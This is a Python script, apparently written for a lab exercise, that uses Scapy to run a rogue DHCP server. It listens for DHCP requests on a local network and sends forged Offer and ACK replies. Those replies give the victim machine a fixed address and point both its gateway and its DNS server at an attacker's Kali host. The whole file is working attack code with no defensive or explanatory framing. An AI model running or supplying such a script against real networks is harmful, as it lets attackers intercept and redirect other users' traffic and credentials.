#!/usr/bin/env python3
import sys
from scapy.all import *

IP_KALI         = "20.25.37.100"
IP_FALSA_OFERTA = "20.25.37.50"
MASCARA         = "255.255.255.0"
BROADCAST       = "20.25.37.255"

def get_dhcp_type(pkt):
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == 'message-type':
            return opt[1]
    return None

def servidor_dhcp_falso(pkt):
    if not pkt.haslayer(DHCP) or not pkt.haslayer(BOOTP):
        return

    if pkt[IP].src == IP_KALI:
        return

    tipo_mensaje = get_dhcp_type(pkt)
    if tipo_mensaje is None:
        return

    mac_victima = pkt[Ether].src
    xid_cliente = pkt[BOOTP].xid
    mac_bytes   = bytes.fromhex(mac_victima.replace(":", "")) + b'\x00' * 10

    if tipo_mensaje == 1:
        print(f"[*] Discover de {mac_victima} — enviando Offer...")

        eth   = Ether(src=get_if_hwaddr(conf.iface), dst="ff:ff:ff:ff:ff:ff")
        ip    = IP(src=IP_KALI, dst="255.255.255.255")
        udp   = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            xid=xid_cliente,
            flags=0x8000,
            yiaddr=IP_FALSA_OFERTA,
            siaddr=IP_KALI,
            giaddr="0.0.0.0",
            chaddr=mac_bytes
        )
        dhcp = DHCP(options=[
            ("message-type",    "offer"),
            ("server_id",       IP_KALI),
            ("lease_time",      86400),
            ("renewal_time",    43200),
            ("rebinding_time",  75600),
            ("subnet_mask",     MASCARA),
            ("broadcast_address", BROADCAST),
            ("router",          IP_KALI),
            ("name_server",     IP_KALI),
            "end"
        ])
        sendp(eth/ip/udp/bootp/dhcp, iface=conf.iface, verbose=False)

    elif tipo_mensaje == 3:
        server_id = None
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == 'server_id':
                server_id = opt[1]
                break

        if server_id and server_id != IP_KALI:
            print(f"[!] Request para otro servidor ({server_id}), ignorando.")
            return

        print(f"[*] Request de {mac_victima} — enviando ACK...")

        eth   = Ether(src=get_if_hwaddr(conf.iface), dst="ff:ff:ff:ff:ff:ff")
        ip    = IP(src=IP_KALI, dst="255.255.255.255")
        udp   = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            xid=xid_cliente,
            flags=0x8000,
            yiaddr=IP_FALSA_OFERTA,
            siaddr=IP_KALI,
            giaddr="0.0.0.0",
            chaddr=mac_bytes
        )
        dhcp = DHCP(options=[
            ("message-type",    "ack"),
            ("server_id",       IP_KALI),
            ("lease_time",      86400),
            ("renewal_time",    43200),
            ("rebinding_time",  75600),
            ("subnet_mask",     MASCARA),
            ("broadcast_address", BROADCAST),
            ("router",          IP_KALI),
            ("name_server",     IP_KALI),
            "end"
        ])
        sendp(eth/ip/udp/bootp/dhcp, iface=conf.iface, verbose=False)
        print(f"[+] ¡ÉXITO! {mac_victima} → IP: {IP_FALSA_OFERTA} | GW: {IP_KALI}")

def lanzar_ataque(interfaz):
    print(f"[*] Servidor Rogue DHCP activo en la interfaz {interfaz}.")
    print("[*] Esperando víctimas... (Ctrl+C para detener)")
    conf.iface = interfaz
    sniff(
        filter="udp and (port 67 or port 68)",
        prn=servidor_dhcp_falso,
        store=0,
        iface=interfaz
    )

if __name__ == "__main__":
    interfaz_red = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    lanzar_ataque(interfaz_red)
